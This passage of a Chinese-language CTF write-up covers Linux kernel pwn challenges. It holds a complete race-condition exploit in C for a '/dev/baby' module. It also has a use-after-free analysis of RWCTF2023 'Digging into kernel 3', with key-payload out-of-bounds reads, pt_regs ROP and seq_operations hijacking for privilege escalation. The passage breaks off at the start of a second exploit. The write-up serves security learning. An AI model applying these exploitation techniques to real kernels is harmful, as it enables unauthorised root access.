class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr;</span><br><span class="line"><span class="type">int</span> finish =<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[LEN+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程函数，不断修改flag指向的地址为内核中flag地址</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_attr_value</span><span class="params">(<span class="type">void</span> *s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> * <span class="title">s1</span> =</span> s; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)&#123;</span><br><span class="line">        s1-&gt;flag = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> addr_fd;</span><br><span class="line">    <span class="type">char</span> *idx;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> ret = ioctl(fd,<span class="number">0x6666</span>);    </span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取内核硬编码的flag地址</span></span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addr_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,-LEN,SEEK_END);</span><br><span class="line">    read(addr_fd,buf,LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        idx+=<span class="number">16</span>;</span><br><span class="line">        addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造attr数据结构</span></span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    t.flag = buf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建恶意线程</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change_attr_value,&amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ret = ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_cancel(t1);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RWCTF2023体验赛-Digging-into-kernel-3"><a href="#RWCTF2023体验赛-Digging-into-kernel-3" class="headerlink" title="[RWCTF2023体验赛] Digging into kernel 3"></a>[RWCTF2023体验赛] Digging into kernel 3</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  Input input; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;input, a3, <span class="number">16LL</span>) &amp;&amp; input.index &lt;= <span class="number">1u</span> )</span><br><span class="line">      kfree(buf[input.index]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;input, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    index = (<span class="type">unsigned</span> <span class="type">int</span>)input.index;</span><br><span class="line">    <span class="keyword">if</span> ( input.index &gt; <span class="number">1u</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[index] = _kmalloc((<span class="type">unsigned</span> <span class="type">int</span>)input.size, <span class="number">0xDC0</span>LL);</span><br><span class="line">    v6 = buf[input.index];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input.size &gt; <span class="number">0x7FFFFFFF</span>uLL )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, input.buf, (<span class="type">unsigned</span> <span class="type">int</span>)input.size) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在内核中最多可以同时拥有2个堆块。可以看见当选项为<code>0xC0DECAFE</code>时，将堆块<code>kfree</code>后并没有将指针置空，存在<code>UAF</code>漏洞。通过程序分析，我们需要传入的是下面这个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>该思路主要用到的结构体有<code>seq_file</code>、<code>pt_regs</code>、内核密钥管理。<br>我们首先看看内核密钥管理<br>该管理的详细信息可以看：<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</a><br>其类似内核中的菜单堆，我们可以通过下面这些函数来对其进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen, </span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面重点看看user_key_payload结构体</p><h4 id="user-key-payload"><a href="#user-key-payload" class="headerlink" title="user_key_payload"></a>user_key_payload</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="type">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>该结构是用于存储密钥的<code>payload</code>，当我们调用<code>key_read</code>函数来获取<code>payload</code>的数据时，读取的长度由<code>datalen</code>这个变量来决定。所以我们可以想到利用<code>UAF</code>漏洞来将<code>datalen</code>的数值改大，导致在获取<code>payload</code>的数据时越界读，泄露出内核的地址<br>那我们要读取哪里才可以获得内核地址呢，我们可以看到上面的<code>callback_head</code>结构体里面存在一个函数指针，当密钥的<code>type</code>为<code>user</code>时，在<code>payload</code>被释放时该指针会被赋值为<code>user_free_payload_rcu()</code>，因此我们可以先释放掉一段<code>payload</code>，然后通过越界读来获取改指针的值，计算出内核的基址<br>需要注意的是，<code>add_key()</code> 会先分配一个临时的 <code>obj1</code> 拷贝 <code>payload</code> 后再分配一个 <code>obj2</code> 作为 <code>user_key_payload</code>，若我们先分配一个 <code>obj</code> 并释放后再调用 <code>add_key()</code> 则该 <code>obj</code> 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在<br>在泄露出内核地址后，我们的要考虑的是如果劫持程序流，这里我们可以将<code>seq_file</code>和<code>pt_regs</code>结合起来利用。我们首先来看看<code>pt_regs</code>结构体</p><h4 id="pt-regs-1"><a href="#pt-regs-1" class="headerlink" title="pt_regs"></a>pt_regs</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们执行系统调用时，内核会将所有寄存器压入内核栈上，形成该<code>pt_regs</code>结构体，该结构体位于内核的栈底。当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时<code>rsp</code>与栈底的相对偏移通常是不变的，所以这些寄存器为我们布置<code>ROP</code>链条提供了可能，只要找到一条类似于<code>add rsp, xxx; ret</code>的<code>gadget</code>就能够完成<code>ROP</code></p><h4 id="方便调试模板"><a href="#方便调试模板" class="headerlink" title="方便调试模板"></a>方便调试模板</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">       <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>但是在高版本的内核中会默认开启<code>CONFIG_RANDOMIZE_KSTACK_OFFSET=y</code>保护，该保护为系统调用添加了一个偏移，即<code>pt_regs</code>与我们触发劫持内核执行流的栈偏移值不再是固定值，导致我们难以再使用改方法<br>接下来简单看<code>seq_file</code>相关结构体，详细内容可以查看：<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</a><br>当我们打开<code>proc/self/stat</code>文件即可分配到一个<code>seq_operations</code>结构体</p><h4 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们<code>read</code>一个<code>stat</code>文件时，内核会调用<code>proc_ops</code>的<code>proc_read_iter</code>指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即会调用<code>seq_operations</code>的<code>start</code>函数。在这一道题目中我们不难想到，可以利用<code>UAF</code>漏洞将<code>seq_operations</code>中的<code>start</code>函数的函数指针改为类似于<code>add rsp, xxx</code>这样的<code>gadget</code>，然后布置好我们的<code>pt_regs</code>结构体，最后通过<code>read</code>一个<code>stat</code>文件来劫持内核程序流来实现提权</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"></span><br><span class="line"><span 